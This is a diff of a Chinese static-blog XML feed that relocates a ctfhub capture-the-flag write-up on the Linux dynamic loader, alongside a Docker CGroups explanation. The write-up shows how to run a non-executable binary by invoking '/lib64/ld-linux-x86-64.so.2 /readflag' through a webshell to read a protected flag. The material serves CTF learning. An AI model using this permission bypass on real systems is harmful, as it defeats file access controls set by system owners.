+<p>我们通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们<code>提供物理资源上的隔离</code>，比如 CPU 或者内存，如果在同一台机器上运行了多个对彼此以及宿主机器一无所知的『容器』，这些容器却共同占用了宿主机器的物理资源。<br>如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I&#x2F;O 和网络带宽。<br><code>在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。</code></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>kali</tag>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -860,42 +860,6 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       </tags>
   </entry>
   <entry>
-    <title>linux动态加载</title>
-    <url>/2023/07/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
-    <content><![CDATA[<h2 id="linux动态加载"><a href="#linux动态加载" class="headerlink" title="linux动态加载"></a>linux动态加载</h2><h1 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h1><p>先给了755<br>他自己传了flag 等于告诉我们在哪了<br>然后限到了644<br>不想让我们直接看</p>
-<blockquote>
-<p>都到这一题了权限应该不用讲了</p>
-</blockquote>
-<p>提示给了shell<br>且不需要提权<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254104587-61.png" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
-<h1 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h1><h2 id="elf文件"><a href="#elf文件" class="headerlink" title="elf文件"></a>elf文件</h2><p>elf文件是linux下的可执行文件<br>文件头为elf</p>
-<blockquote>
-<p>不知道是靶机还是蚁剑虚拟终端的问题 没法vi<br>直接cat就能看到了</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254108304-64.png" alt="在这里插入图片描述"></p>
-</blockquote>
-<h2 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h2><ul>
-<li>当需要动态链接的应用被操作系统加载时</li>
-<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
-<li>在Linux环境下，这项工作是由ld-linux.so.2来负责完成的</li>
-<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
-<li>而不是交给程序正常的进入地址</li>
-<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
-</ul>
-<h2 id="ldd命令"><a href="#ldd命令" class="headerlink" title="ldd命令"></a>ldd命令</h2><p>使用ldd命令即可查看<br>简便的shell命令依赖哪些动态加载库<br><img src= "/img/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254114578-69.png" alt="在这里插入图片描述"></p>
-<h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><p>在cat elf文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在ldd<br>可以看到ls 和 cat动用他了<br>用！<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254120768-72.png" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 &#x2F;readflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>get</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-        <tag>linux</tag>
-        <tag>动态加载</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfhub-jwt</title>
     <url>/2023/07/jwt/</url>
     <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">jwt基础知识</a></p>
@@ -991,6 +955,42 @@ sig <span class="token operator">=</span> base64<span class="token punctuation">
         <tag>web</tag>
         <tag>jwt</tag>
         <tag>json web token</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux动态加载</title>
+    <url>/2023/07/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
+    <content><![CDATA[<h2 id="linux动态加载"><a href="#linux动态加载" class="headerlink" title="linux动态加载"></a>linux动态加载</h2><h1 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h1><p>先给了755<br>他自己传了flag 等于告诉我们在哪了<br>然后限到了644<br>不想让我们直接看</p>
+<blockquote>
+<p>都到这一题了权限应该不用讲了</p>
+</blockquote>
+<p>提示给了shell<br>且不需要提权<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254104587-61.png" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
+<h1 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h1><h2 id="elf文件"><a href="#elf文件" class="headerlink" title="elf文件"></a>elf文件</h2><p>elf文件是linux下的可执行文件<br>文件头为elf</p>
+<blockquote>
+<p>不知道是靶机还是蚁剑虚拟终端的问题 没法vi<br>直接cat就能看到了</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254108304-64.png" alt="在这里插入图片描述"></p>
+</blockquote>
+<h2 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h2><ul>
+<li>当需要动态链接的应用被操作系统加载时</li>
+<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
+<li>在Linux环境下，这项工作是由ld-linux.so.2来负责完成的</li>
+<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
+<li>而不是交给程序正常的进入地址</li>
+<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
+</ul>
+<h2 id="ldd命令"><a href="#ldd命令" class="headerlink" title="ldd命令"></a>ldd命令</h2><p>使用ldd命令即可查看<br>简便的shell命令依赖哪些动态加载库<br><img src= "/img/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254114578-69.png" alt="在这里插入图片描述"></p>
+<h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><p>在cat elf文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在ldd<br>可以看到ls 和 cat动用他了<br>用！<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254120768-72.png" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 &#x2F;readflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>get</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+        <tag>linux</tag>
+        <tag>动态加载</tag>
       </tags>
   </entry>
   <entry>
